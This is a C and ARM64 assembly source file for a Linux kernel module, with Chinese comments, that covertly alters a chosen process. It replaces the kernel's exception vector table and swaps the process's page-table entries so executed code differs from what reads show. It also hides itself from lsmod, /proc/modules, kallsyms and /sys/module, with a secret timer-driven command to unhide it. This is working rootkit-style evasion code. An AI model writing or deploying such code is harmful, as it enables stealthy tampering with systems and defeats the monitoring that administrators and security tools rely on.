/*
 * caoin shadow v2b — 无痕读写分离（VBAR 路线）
 *
 * 对内核的全部触碰 = 一次 msr vbar_el1（可逆）。不写内核任何内存。
 *
 * 结构：
 *  - 模块 .text 内建 2KB 新向量表（16×128B 槽，B 相对跳编译期编码）
 *  - EL0 AArch64 Sync 槽（+0x400）→ caoin_el0_entry：保存全部用户现场，
 *    读 FAR/ESR 调过滤器；命中则切视图后 eret（重执行 fault 指令），
 *    未命中恢复现场后跳旧表入口（状态等价直接异常进入）
 *  - 其余 15 槽 → 各自 passthru：LDR x17 旧入口（地址在 .data 数组，运行时填）+ BR
 *  - 切换：mrs 旧 VBAR → msr 新 VBAR → isb；恢复反向
 *
 * 自隐藏：
 *  - init 尾部（init_module 持 module_mutex 期间，摘链无竞态）：
 *    kobject_del（地址经 cfg 注入）摘 /sys/module/<name>；
 *    list_del 摘 modules 链表 → /proc/modules、lsmod、/proc/kallsyms 全隐
 *  - 解隐藏：timer_list（无可见线程）每秒轮询目标 status 页，
 *    命令字 0xCA0F0001 → list_add 挂回（head 用摘链前保存的 list.prev，
 *    不引用 modules 符号）→ 写回 0xCA0F0002 确认 → 用户 rmmod
 *  - 4.9 module_ktype 无 release，提前 kobject_del 后 rmmod 路径安全
 */
#include <linux/module.h>
#include <linux/mm.h>
#include <linux/sched.h>
#include <linux/timer.h>
#include <asm/pgtable.h>

#undef PAGE_OFFSET
#define PAGE_OFFSET 0xffffffC000000000UL

#define CAOIN_CFG_MAGIC 0xCA03CA03CA03CA03ULL
#define CAOIN_CFG_MARKER 0xDEADCA03DEADCA03ULL

#define PTE_AP_MASK 0xC0UL

struct caoin_cfg {
    u64 marker, magic;
    u64 target_pid;
    u64 target_va;
    u64 shadow_phys;
    u64 expect_phys;
    u64 status_va;
    u64 find_task, probe_read, printk;   /* printk：KP 干扰，仅应急 */
    u64 status_phys;   /* 第二判据：status 页物理（双 expect 防假阳性） */
    u64 p_probe_write; /* probe_kernel_write */
    u64 kobject_del;   /* kobject_del 地址（自隐藏用；0 = 不隐藏） */
    u64 t_init;        /* init_timer_key 地址（自隐藏用） */
    u64 t_mod;         /* mod_timer 地址 */
    u64 t_del;         /* del_timer_sync 地址 */
    u64 jiffies_addr;  /* jiffies 变量地址 */
    u64 unused[1];
    /* 运行态 */
    u64 orig_pte;
    u64 mm_off, pgd_off;
    u64 pte_addr;
    u64 shadow_pte_val;
    u64 origview_pte_val;
    u64 cur_view;
    u64 old_vbar;
    u64 vbar_on;
    u64 mm_run;        /* init 锁定的 mm（unhide 轮询用） */
    u64 saved_prev;    /* 摘链前的 list.prev（unhide 挂回用，不引用 modules 符号） */
    volatile u64 hidden;   /* 0=未隐藏 1=已隐藏 2=已挂回 */
};

static struct caoin_cfg caoin_cfg_block = {
    .marker = CAOIN_CFG_MARKER,
    .magic = 0,
};

static long (*caoin_probe)(void *, void *, unsigned long);
static long (*caoin_pwrite)(void *, const void *, unsigned long);
static int (*caoin_printk)(const char *fmt, ...);
#define CK_LOG(...) do { if (caoin_printk) caoin_printk(__VA_ARGS__); } while (0)

static void caoin_tlb_flush(unsigned long va)
{
    unsigned long addr = va >> 12;
    asm volatile("dsb ish" ::: "memory");
    asm volatile("tlbi vae1is, %0" :: "r"(addr));
    asm volatile("isb" ::: "memory");
}

/* ---- 探测引擎（v1 验证版复用） ---- */

static int caoin_probe_walk(unsigned long mm_cand, unsigned long pgd_off_cand,
                            unsigned long va, unsigned long expect_phys,
                            unsigned long *pte_a_out)
{
    unsigned long pgd_p, e0, e2, pte_v, pte_a;
    const unsigned long m = PHYS_MASK & PAGE_MASK;

    if (caoin_probe(&pgd_p, (void *)(mm_cand + pgd_off_cand), 8))
        return 0;
    if (pgd_p < 0xffffff8000000000UL || (pgd_p & 0xFFF))
        return 0;
    if (caoin_probe(&e0, (void *)(pgd_p + ((va >> 30) & 0x1FF) * 8), 8))
        return 0;
    if (!(e0 & m))
        return 0;
    if (caoin_probe(&e2, (void *)__va((e0 & m) + ((va >> 21) & 0x1FF) * 8), 8))
        return 0;
    if (!(e2 & m))
        return 0;
    pte_a = (unsigned long)__va((e2 & m) + ((va >> 12) & 0x1FF) * 8);
    if (caoin_probe(&pte_v, (void *)pte_a, 8))
        return 0;
    if (expect_phys && (pte_v & m) != expect_phys)
        return 0;
    if (pte_a_out)
        *pte_a_out = pte_a;
    return 1;
}

static int caoin_locate(unsigned long task, unsigned long va, unsigned long expect_phys,
                        unsigned long va2, unsigned long expect2,
                        unsigned long *mm_off_out, unsigned long *pgd_off_out,
                        unsigned long *mm_out, unsigned long *pte_a_out)
{
    unsigned long mm_c, pgd_p, moff, poff;
    for (moff = 0; moff < 0x1800; moff += 8) {
        if (caoin_probe(&mm_c, (void *)(task + moff), 8))
            continue;
        if (mm_c < 0xffffff8000000000UL || (mm_c & 0x7))
            continue;
        for (poff = 0x20; poff < 0x400; poff += 8) {
            if (caoin_probe(&pgd_p, (void *)(mm_c + poff), 8))
                continue;
            if (pgd_p < 0xffffff8000000000UL || (pgd_p & 0xFFF))
                continue;
            if (caoin_probe_walk(mm_c, poff, va, expect_phys, pte_a_out)
                && caoin_probe_walk(mm_c, poff, va2, expect2, 0)) {
                *mm_off_out = moff;
                *pgd_off_out = poff;
                if (mm_out)
                    *mm_out = mm_c;
                return 1;
            }
        }
    }
    return 0;
}

static void caoin_write_status2(unsigned long mm, unsigned long pgd_off,
                                unsigned long va, u64 val)
{
    unsigned long pte_a = 0, pte_v, phys;
    if (!caoin_probe_walk(mm, pgd_off, va, 0, &pte_a))
        return;
    if (caoin_probe(&pte_v, (void *)pte_a, 8))
        return;
    phys = pte_v & PHYS_MASK & PAGE_MASK;
    u64 *slot = (u64 *)__va(phys + (va & ~PAGE_MASK));
    if (caoin_pwrite)
        caoin_pwrite(slot, &val, 8);   /* 防御写：假阳性只失败不损坏 */
    asm volatile("dsb ish" ::: "memory");
}

/* ---- 自隐藏（零内核符号：list 操作 inline，kobject_del 经 cfg 注入） ---- */

#define CAOIN_UNHIDE_CMD  0xCA0F0001ULL
#define CAOIN_UNHIDE_ACK  0xCA0F0002ULL

static struct timer_list caoin_unhide_timer;
/* 本树 init_timer_key 为 4 参（无 func），function 需单独赋值 */
static void (*caoin_tinit)(void *, unsigned int, const char *, void *);
static int (*caoin_tmod)(void *, unsigned long);
static int (*caoin_tdel)(void *);
static volatile unsigned long *caoin_jp;

/* 中断上下文：只做页表 walk + probe 读，不碰当前进程地址空间 */
static void caoin_unhide_tick(unsigned long arg)
{
    struct caoin_cfg *c = &caoin_cfg_block;
    unsigned long pte_a = 0, pte_v;
    u64 cmd = 0, *slot;
    int walk_ok;

    if (c->hidden != 1 || !c->mm_run) {
        CK_LOG("caoin2b: tick skip h=%lu mm=%lx\n", c->hidden, c->mm_run);
        goto out;
    }
    walk_ok = caoin_probe_walk(c->mm_run, c->pgd_off,
                               (unsigned long)c->status_va, 0, &pte_a);
    if (!walk_ok) {
        CK_LOG("caoin2b: tick walk fail\n");
        goto out;
    }
    if (caoin_probe(&pte_v, (void *)pte_a, 8)) {
        CK_LOG("caoin2b: tick pte read fail\n");
        goto out;
    }
    slot = (u64 *)__va((pte_v & PHYS_MASK & PAGE_MASK) +
                       ((unsigned long)c->status_va & ~PAGE_MASK));
    if (caoin_probe(&cmd, slot, 8)) {
        CK_LOG("caoin2b: tick cmd read fail\n");
        goto out;
    }
    CK_LOG("caoin2b: tick cmd=%lx\n", cmd);
    if (cmd == CAOIN_UNHIDE_CMD) {
        c->hidden = 2;   /* 先翻状态防重复 add（重复 add = 链表损坏） */
        list_add(&THIS_MODULE->list,
                 (struct list_head *)(unsigned long)c->saved_prev);
        caoin_write_status2(c->mm_run, c->pgd_off,
                            (unsigned long)c->status_va, CAOIN_UNHIDE_ACK);
        CK_LOG("caoin2b: unhide, relisted\n");
    }
out:
    if (caoin_tmod && caoin_jp)
        caoin_tmod(&caoin_unhide_timer, *caoin_jp + HZ);
}

/* ---- 异常过滤（v2c：BRK + 硬件单步模型，借 wxshadow 状态机） ----
 * 视图三态：SHADOW_X（shadow | X-only）
 *           STEPPING（original | 可执行 RO）——BRK 后单步执行原指令
 *           常规读请求：SHADOW_X 时切 STEPPING（可读），STEPPING 天然可读
 * 关键：BRK/单步保证每次异常后 PC 前进——无 eret 重执行死循环。
 *
 * regs 指针由向量表入口提供（SP_EL1 内的 pt_regs 布局），
 * SPSR_EL1.SS / MDSCR_EL1.SS 置硬件单步，eret 后一条指令触发 Software Step。 */

/* pt_regs 布局：callee-saved 区由 el0_entry 的帧提供。
 * 这里只改 PSTATE.SS（经 spsr 指针）——入口帧偏移由汇编保证。 */

int caoin_fault_check(unsigned long addr, unsigned long pc,
                      unsigned int esr, unsigned long *spsr_p)
{
    struct caoin_cfg *c = &caoin_cfg_block;
    unsigned int ec = esr >> 26;
    unsigned int iss = esr & 0x1FFFFFF;
    u64 mdscr;

    /* 1) 我们桩的 BRK #0xCA0（EC=0x3C BRK，imm 在 iss[15:0]） */
    if (ec == 0x3C && ((iss & 0xFFFF) == 0xCA0)) {
        if ((pc >> 12) != ((unsigned long)c->target_va >> 12))
            return 0;    /* 非受管页的 0xCA0 BRK：放行给系统 */
        /* SHADOW_X → STEPPING：original 物理 + 可执行 RO */
        set_pte((pte_t *)(unsigned long)c->pte_addr,
                __pte((unsigned long)c->origview_pte_val));
        c->cur_view = 2;   /* STEPPING */
        caoin_tlb_flush((unsigned long)c->target_va);
        /* 开硬件单步：MDSCR_EL1.SS=1 且 SPSR_EL1.SS=1 → eret 后一条指令 step */
        asm volatile("mrs %0, mdscr_el1" : "=r"(mdscr));
        mdscr |= (1UL << 0);
        asm volatile("msr mdscr_el1, %0" :: "r"(mdscr));
        asm volatile("isb" ::: "memory");
        if (spsr_p)
            *spsr_p |= (1UL << 21);   /* SPSR.SS */
        return 1;
    }

    /* 2) Software Step（EC=0x32，EL0） */
    if (ec == 0x32) {
        /* STEPPING → SHADOW_X：回到 X-only（下一断点/读请求再触发） */
        set_pte((pte_t *)(unsigned long)c->pte_addr,
                __pte((unsigned long)c->shadow_pte_val));
        c->cur_view = 1;
        caoin_tlb_flush((unsigned long)c->target_va);
        asm volatile("mrs %0, mdscr_el1" : "=r"(mdscr));
        mdscr &= ~(1UL << 0);
        asm volatile("msr mdscr_el1, %0" :: "r"(mdscr));
        asm volatile("isb" ::: "memory");
        if (spsr_p)
            *spsr_p &= ~(1UL << 21);
        return 1;
    }

    /* 3) 读请求跷跷板（数据 abort，EL0 非写）：任何视图切 STEPPING（可读） */
    if (ec == 0x24 && !(esr & (1 << 6)) &&
        (addr >> 12) == ((unsigned long)c->target_va >> 12)) {
        if (c->cur_view == 1) {
            set_pte((pte_t *)(unsigned long)c->pte_addr,
                    __pte((unsigned long)c->origview_pte_val));
            c->cur_view = 2;
            caoin_tlb_flush((unsigned long)c->target_va);
        }
        return 1;   /* STEPPING 本身可读；重执行读不再 fault */
    }

    /* 4) 取指权限 fault（EC=0x20）且页是 STEPPING：不应发生（STEPPING 可执行），
          但防御：切回 SHADOW_X？不——STEPPING 可执行不会 0x20；放行 */
    return 0;
}

/* ---- 向量表与入口（全部编译期编码；旧入口地址在 .data 数组运行时填） ---- */

/* 旧表 16 个入口地址 + EL0 Sync 旧入口（.data：init 运行时填，可写） */
volatile unsigned long caoin_slot_tab[16];
volatile unsigned long caoin_old_el0_sync;

/* 每槽独立跳板：烧 x16（IP0 scratch）取目标，x17 完整恢复。 */
#define CAOIN_PASS(N)                                   \
"caoin_p" #N ":\n"                                      \
"    stp x16, x17, [sp, #-16]!\n"                       \
"    ldr x16, =caoin_slot_tab\n"                        \
"    ldr x16, [x16, #" #N "*8]\n"                       \
"    ldr x17, [sp, #8]\n"                               \
"    add sp, sp, #16\n"                                 \
"    br x16\n"

asm(
".balign 2048\n"
".global caoin_vbar\n"
"caoin_vbar:\n"
/* 槽 0-7：B 各自 pass + nop 填满 128B */
"    b caoin_p0\n"
"    .rept 31\n nop\n .endr\n"
"    b caoin_p1\n"
"    .rept 31\n nop\n .endr\n"
"    b caoin_p2\n"
"    .rept 31\n nop\n .endr\n"
"    b caoin_p3\n"
"    .rept 31\n nop\n .endr\n"
"    b caoin_p4\n"
"    .rept 31\n nop\n .endr\n"
"    b caoin_p5\n"
"    .rept 31\n nop\n .endr\n"
"    b caoin_p6\n"
"    .rept 31\n nop\n .endr\n"
"    b caoin_p7\n"
"    .rept 31\n nop\n .endr\n"
/* 槽 8（0x400，Lower EL AArch64 Sync）→ 过滤器 */
"    b caoin_el0_entry\n"
"    .rept 31\n nop\n .endr\n"
/* 槽 9-15 */
"    b caoin_p9\n"
"    .rept 31\n nop\n .endr\n"
"    b caoin_p10\n"
"    .rept 31\n nop\n .endr\n"
"    b caoin_p11\n"
"    .rept 31\n nop\n .endr\n"
"    b caoin_p12\n"
"    .rept 31\n nop\n .endr\n"
"    b caoin_p13\n"
"    .rept 31\n nop\n .endr\n"
"    b caoin_p14\n"
"    .rept 31\n nop\n .endr\n"
"    b caoin_p15\n"
"    .rept 31\n nop\n .endr\n"
CAOIN_PASS(0) CAOIN_PASS(1) CAOIN_PASS(2) CAOIN_PASS(3)
CAOIN_PASS(4) CAOIN_PASS(5) CAOIN_PASS(6) CAOIN_PASS(7)
CAOIN_PASS(9) CAOIN_PASS(10) CAOIN_PASS(11) CAOIN_PASS(12)
CAOIN_PASS(13) CAOIN_PASS(14) CAOIN_PASS(15)
);

extern char caoin_vbar[];

/* ---- EL0 Sync 入口（v2c：取 PC/SPSR，调用新签名过滤器，命中走 eret） ----
 * 帧布局（sp 向下 256B）：
 *   [0]=x29 [8]=x30 [16]=x0 [24]=x1 ... [144]=x16 [152]=x17 [160]=x18
 *   [168]=ELR_EL1（eret 用）  [176]=SPSR_EL1（caoin_fault_check 改 SPSR.SS）
 *   [184]=原 SP_EL0
 * eret 前必须恢复 SP_EL0（eret 弹的是 SPSR/ELR，SP 得自己恢复）。 */
asm(
".global caoin_el0_entry\n"
"caoin_el0_entry:\n"
"    stp x29, x30, [sp, #-256]!\n"
"    mov x29, sp\n"
"    stp x0, x1, [sp, #16]\n"
"    stp x2, x3, [sp, #32]\n"
"    stp x4, x5, [sp, #48]\n"
"    stp x6, x7, [sp, #64]\n"
"    stp x8, x9, [sp, #80]\n"
"    stp x10, x11, [sp, #96]\n"
"    stp x12, x13, [sp, #112]\n"
"    stp x14, x15, [sp, #128]\n"
"    stp x16, x17, [sp, #144]\n"
"    stp x18, xzr, [sp, #160]\n"
"    mrs x0, far_el1\n"
"    mrs x1, elr_el1\n"            /* PC */
"    mrs x2, esr_el1\n"
"    mrs x3, spsr_el1\n"
"    str x3, [x29, #176]\n"        /* spsr 槽（过滤器可改 SS 位） */
"    mov x3, x29\n"
"    add x3, x3, #176\n"           /* spsr_p */
"    bl caoin_fault_check\n"
"    cbnz w0, 2f\n"
"    /* 未命中：恢复现场，跳旧 EL0 Sync 入口（它自己处理 pt_regs 全量保存） */\n"
"    ldp x0, x1, [sp, #16]\n"
"    ldp x2, x3, [sp, #32]\n"
"    ldp x4, x5, [sp, #48]\n"
"    ldp x6, x7, [sp, #64]\n"
"    ldp x8, x9, [sp, #80]\n"
"    ldp x10, x11, [sp, #96]\n"
"    ldp x12, x13, [sp, #112]\n"
"    ldp x14, x15, [sp, #128]\n"
"    ldp x16, x17, [sp, #144]\n"
"    ldp x18, xzr, [sp, #160]\n"
"    ldp x29, x30, [sp], #256\n"
"    ldr x17, =caoin_old_el0_sync\n"
"    br x17\n"
"2:\n"
"    /* 已处理：恢复通用现场，eret（ELR 未变 = 重执行/继续；SPSR 可能带 SS） */\n"
"    ldp x0, x1, [sp, #16]\n"
"    ldp x2, x3, [sp, #32]\n"
"    ldp x4, x5, [sp, #48]\n"
"    ldp x6, x7, [sp, #64]\n"
"    ldp x8, x9, [sp, #80]\n"
"    ldp x10, x11, [sp, #96]\n"
"    ldp x12, x13, [sp, #112]\n"
"    ldp x14, x15, [sp, #128]\n"
"    ldp x16, x17, [sp, #144]\n"
"    ldp x18, xzr, [sp, #160]\n"
"    ldr x0, [x29, #176]\n"
"    msr spsr_el1, x0\n"
"    ldp x29, x30, [sp], #256\n"
"    eret\n"
".align 3\n"
"caoin_old_el0_sync_alt:\n"
"    nop\n"
);

/* 悬案记录（v2c 第一轮实测）：
 * livelock 在内核态（stime 暴涨、flt# 零日志）——EL0 Sync 异常可能走的是
 * 旧表的 EL1 槽路径（SPSR.M 位或 KP 改写向量路由），我们只接管了 0x400 槽。
 * 转发到旧入口时内核 handler 拿到我们的非标准帧 → 内核态二次异常 → 风暴。
 * 修复方向：EL0/EL1 的 Sync 槽都接管（0x200/0x400/0x600），或先在未命中
 * 路径改为"重建标准内核帧后调用旧 C 入口"而不是跳旧汇编入口。 */



static int __init caoin_init(void)
{
    struct caoin_cfg *c = &caoin_cfg_block;
    unsigned long mm_off, pgd_off, mmv, pte_a, orig_pte_v;
    const unsigned long m = PHYS_MASK & PAGE_MASK;
    unsigned long old_vbar;
    unsigned long *tab = (unsigned long *)caoin_slot_tab;
    struct task_struct *(*find_task)(int);
    struct task_struct *task;

    if (c->magic != CAOIN_CFG_MAGIC || !c->find_task || !c->probe_read)
        return -EINVAL;

    caoin_probe = (void *)(unsigned long)c->probe_read;
    caoin_pwrite = (void *)(unsigned long)c->p_probe_write;
    caoin_printk = (void *)(unsigned long)c->printk;
    find_task = (void *)(unsigned long)c->find_task;
    task = find_task((int)c->target_pid);
    if (!task)
        return -ESRCH;

    if (!caoin_locate((unsigned long)task, (unsigned long)c->target_va,
                      (unsigned long)c->expect_phys,
                      (unsigned long)c->status_va, (unsigned long)c->status_phys,
                      &mm_off, &pgd_off, &mmv, &pte_a))
        return -ENOENT;
    c->mm_off = mm_off;
    c->pgd_off = pgd_off;
    c->pte_addr = pte_a;
    c->mm_run = mmv;
    caoin_write_status2(mmv, pgd_off, (unsigned long)c->status_va, 0x5);   /* 组合锁定 */
    CK_LOG("caoin2b: combo locked mm=%lx pgd=%lx pte=%lx\n", mm_off, pgd_off, pte_a);

    if (caoin_probe(&orig_pte_v, (void *)pte_a, 8))
        return -ENOENT;
    c->orig_pte = orig_pte_v;

    c->shadow_pte_val = (orig_pte_v & ~(m | PTE_AP_MASK | (1UL << 54)))
                      | ((unsigned long)c->shadow_phys & m)
                      | 0x80UL;                 /* AP=10: EL0 数据访问 fault */
    c->origview_pte_val = (orig_pte_v & ~(PTE_AP_MASK | (1UL << 54)))
                        | 0x40UL | (1UL << 54); /* AP=01 RO, UXN=1 */

    /* 旧向量表地址数组（.data 可写，无需解锁任何页） */
    {
        int i;
        asm volatile("mrs %0, vbar_el1" : "=r"(old_vbar));
        c->old_vbar = old_vbar;
        for (i = 0; i < 16; i++)
        for (i = 0; i < 16; i++)
            tab[i] = old_vbar + i * 0x80;
        caoin_old_el0_sync = old_vbar + 0x400;
    }
    /* 切 VBAR（对内核的全部触碰） */
    asm volatile("msr vbar_el1, %0" :: "r"((unsigned long)caoin_vbar));
    asm volatile("isb" ::: "memory");
    c->vbar_on = 1;

    /* 切 shadow 视图（先预检 pte 位置可写：原值回写测试） */
    {
        unsigned long cur_v = 0;
        caoin_probe(&cur_v, (void *)(unsigned long)c->pte_addr, 8);
        if (caoin_pwrite((void *)(unsigned long)c->pte_addr, &cur_v, 8) != 0) {
            CK_LOG("caoin2b: pte slot not writable, bail\n");
            return -EINVAL;
        }
    }
    set_pte((pte_t *)(unsigned long)c->pte_addr, __pte((unsigned long)c->shadow_pte_val));
    c->cur_view = 1;
    caoin_tlb_flush((unsigned long)c->target_va);
    caoin_write_status2(mmv, pgd_off, (unsigned long)c->status_va, 0x6);   /* PTE 已换 */
    CK_LOG("caoin2b: pte switched\n");

    /* 读回验证：PTE 实际值编码写 status（0xA0000000 + 低 20 位） */
    {
        unsigned long back = 0;
        caoin_probe(&back, (void *)(unsigned long)c->pte_addr, 8);
        caoin_write_status2(mmv, pgd_off, (unsigned long)c->status_va,
                            0xA0000000u | (back & 0xFFFFF));
        CK_LOG("caoin2b: pte want=%lx back=%lx @%lx\n",
               (unsigned long)c->shadow_pte_val, back, (unsigned long)c->pte_addr);
    }

    caoin_write_status2(mmv, pgd_off, (unsigned long)c->status_va, 0x7);   /* 全部就绪 */
    CK_LOG("caoin2b: on (vbar %lx -> %lx)\n", old_vbar, (unsigned long)caoin_vbar);

    /* ---- 自隐藏（此刻 init_module 持 module_mutex，摘链无竞态） ---- */
    if (c->kobject_del && c->t_init && c->t_mod && c->t_del && c->jiffies_addr) {
        void (*kdel)(void *) = (void *)(unsigned long)c->kobject_del;
        caoin_tinit = (void *)(unsigned long)c->t_init;
        caoin_tmod = (void *)(unsigned long)c->t_mod;
        caoin_tdel = (void *)(unsigned long)c->t_del;
        caoin_jp = (volatile unsigned long *)(unsigned long)c->jiffies_addr;
        c->saved_prev = (u64)(unsigned long)THIS_MODULE->list.prev;
        kdel(&THIS_MODULE->mkobj.kobj);      /* /sys/module/<name> 摘除 */
        list_del(&THIS_MODULE->list);        /* /proc/modules、lsmod、kallsyms 隐 */
        c->hidden = 1;
        caoin_tinit(&caoin_unhide_timer, 0, 0, 0);
        caoin_unhide_timer.function = caoin_unhide_tick;
        caoin_tmod(&caoin_unhide_timer, *caoin_jp + HZ);
        caoin_write_status2(mmv, pgd_off, (unsigned long)c->status_va, 0x8);
        CK_LOG("caoin2b: hidden (prev=%lx)\n", (unsigned long)c->saved_prev);
    }
    return 0;
}

static void __exit caoin_exit(void)
{
    struct caoin_cfg *c = &caoin_cfg_block;
    if (caoin_tdel)
        caoin_tdel(&caoin_unhide_timer);
    if (c->magic != CAOIN_CFG_MAGIC || !c->pte_addr)
        return;
    caoin_probe = (void *)(unsigned long)c->probe_read;

    /* 视图合一 */
    set_pte((pte_t *)(unsigned long)c->pte_addr, __pte((unsigned long)c->orig_pte));
    c->cur_view = 0;
    caoin_tlb_flush((unsigned long)c->target_va);

    /* 恢复 VBAR */
    if (c->vbar_on && c->old_vbar) {
        asm volatile("msr vbar_el1, %0" :: "r"((unsigned long)c->old_vbar));
        asm volatile("isb" ::: "memory");
        c->vbar_on = 0;
    }

    struct task_struct *(*find_task)(int) =
        (void *)(unsigned long)c->find_task;
    struct task_struct *task = find_task((int)c->target_pid);
    if (task) {
        unsigned long mmv = 0;
        caoin_probe(&mmv, (void *)((unsigned long)task + c->mm_off), 8);
        if (mmv)
            caoin_write_status2(mmv, c->pgd_off, (unsigned long)c->status_va, 0xF);
    }
    CK_LOG("caoin2b: off, restored\n");
}

module_init(caoin_init);
module_exit(caoin_exit);
MODULE_LICENSE("GPL");
